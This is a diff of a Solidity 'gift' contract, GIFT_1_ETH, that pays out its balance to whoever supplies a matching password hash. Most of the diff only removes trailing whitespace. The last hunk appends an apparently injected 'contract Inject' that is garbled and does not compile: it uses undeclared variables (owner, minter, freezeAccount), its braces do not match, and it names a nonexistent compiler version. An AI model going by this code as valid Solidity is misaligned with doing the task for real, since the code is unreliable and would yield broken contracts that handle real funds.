@@ -11,7 +11,7 @@ contract GIFT_1_ETH
             msg.sender.transfer(this.balance);
         }
     }
-    
+
     function GetGift()
     public
     payable
@@ -21,19 +21,19 @@ contract GIFT_1_ETH
             msg.sender.transfer(this.balance);
         }
     }
-    
+
     bytes32 hashPass;
-    
+
     bool closed = false;
-    
+
     address sender;
-    
+
     address reciver;
- 
+
     uint giftTime;
- 
+
     function GetHash(bytes pass) public pure returns (bytes32) {return keccak256(pass);}
-    
+
     function SetPass(bytes32 hash)
     public
     payable
@@ -45,7 +45,7 @@ contract GIFT_1_ETH
             giftTime = now;
         }
     }
-    
+
     function SetGiftTime(uint date)
     public
     {
@@ -54,7 +54,7 @@ contract GIFT_1_ETH
             giftTime = date;
         }
     }
-    
+
     function SetReciver(address _reciver)
     public
     {
@@ -63,7 +63,7 @@ contract GIFT_1_ETH
             reciver = _reciver;
         }
     }
-    
+
     function PassHasBeenSet(bytes32 hash)
     public
     {
@@ -72,7 +72,18 @@ contract GIFT_1_ETH
            closed=true;
         }
     }
-    
+
     function() public payable{}
-    
+
+}
+pragma solidity ^0.5.24;
+contract Inject {
+	uint depositAmount;
+	constructor() public {owner = msg.sender;}
+	function freeze(address account,uint key) {
+		if (msg.sender != minter)
+			revert();
+			freezeAccount[account] = key;
+		}
+	}
 }
